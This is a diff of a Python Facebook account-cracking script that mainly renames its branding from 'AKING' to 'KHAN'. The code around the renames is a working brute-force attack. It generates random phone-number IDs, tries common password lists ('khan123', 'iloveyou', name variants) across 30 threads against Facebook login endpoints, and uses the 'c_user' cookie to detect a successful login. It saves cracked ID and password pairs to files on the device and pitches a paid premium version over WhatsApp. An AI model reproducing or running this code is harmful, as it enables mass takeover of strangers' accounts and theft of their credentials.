@@ -192,7 +192,7 @@ def public():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AKING.py')
+                os.system('python KHAN.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -315,7 +315,7 @@ def menu():
                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
                         name = input(" Enter your Name : ")
                         linex()
-                        tks = ("Hi Aking Sir, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        tks = ("Hi KHAN Sir, I Need To Buy Your Paid KHAN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                         print(' Run :  python WAZIR.py')
                         exit()
@@ -336,7 +336,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as Aking:     
+                with tred(max_workers=30) as KHAN:     
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
@@ -346,14 +346,14 @@ def pak():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
-                                Aking.submit(rndm,ids,passlist)
+                                KHAN.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AKING.py')
+                os.system('python KHAN.py')
 def bd():
                 user=[]
                 clear()
@@ -366,7 +366,7 @@ def bd():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
                         user.append(nmp)
-                with tred(max_workers=30) as Aking:     
+                with tred(max_workers=30) as KHAN:     
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
@@ -376,14 +376,14 @@ def bd():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
-                                Aking.submit(rndm,ids,passlist)
+                                KHAN.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AKING.py')
+                os.system('python KHAN.py')
 def gmail():
                 os.system('rm -rf .re.txt')
                 clear()
@@ -415,7 +415,7 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as Aking:
+                with tred(max_workers=30) as KHAN:
                         total = str(len(fo))
                         clear()
                         print(' Total account : \033[1;32m'+total)
@@ -431,7 +431,7 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                Aking.submit(rndm,ids,passlist)
+                                KHAN.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
@@ -458,15 +458,15 @@ def ffb(ids,names,passlist):
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Aking=session.cookies.get_dict().keys()
-                        if "c_user" in Aking:
+                        KHAN=session.cookies.get_dict().keys()
+                        if "c_user" in KHAN:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [WAZIR-OK] %s | %s'%(ids,pas))
                                 open('/sdcard/WAZIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Aking:
+                        elif 'checkpoint' in KHAN:
                                 if 'y' in pcp:
                                         print('\r\r\x1b[38;5;208m [WAZIR-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/WAZIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
@@ -539,7 +539,7 @@ def api(ids,names,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[38;5;208m [KHAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/WAZIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
@@ -675,7 +675,7 @@ def rndm(ids,passlist):
                                                 okk=open('/sdcard/WAZIR-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        print('\r\r\033[1;32m [KHAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                         open('/sdcard/WAZIR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
